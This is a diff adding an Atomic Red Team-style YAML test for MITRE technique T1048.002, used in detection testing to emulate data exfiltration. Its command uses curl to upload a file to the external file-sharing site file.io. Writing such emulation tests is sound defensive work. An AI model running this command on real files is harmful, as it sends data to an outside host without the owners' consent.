@@ -1,0 +1,26 @@
+---
+attack_technique: T1048.002
+display_name: Exfiltration Over Alternative Protocol - Exfiltration Over Asymmetric Encrypted Non-C2 Protocol
+
+atomic_tests:
+- name:  Exfiltrate data HTTPS using curl
+  auto_generated_guid: 4a4f31e2-46ea-4c26-ad89-f09ad1d5fe01
+  description: |
+    Exfiltrate data HTTPS using curl to file share site file.io
+
+  supported_platforms:
+    - windows
+    - macos
+    - linux
+
+  input_arguments:
+    input_file:
+      description: Test file to upload
+      type: Path
+      default: PathToAtomicsFolder/T1048.002/files/artifact
+
+  executor:
+    name: bash
+    elevation_required: false
+    command: |
+      curl -F 'file=@#{input_file}' -F 'maxDownloads=1' -F 'autoDelete=true' https://file.io/
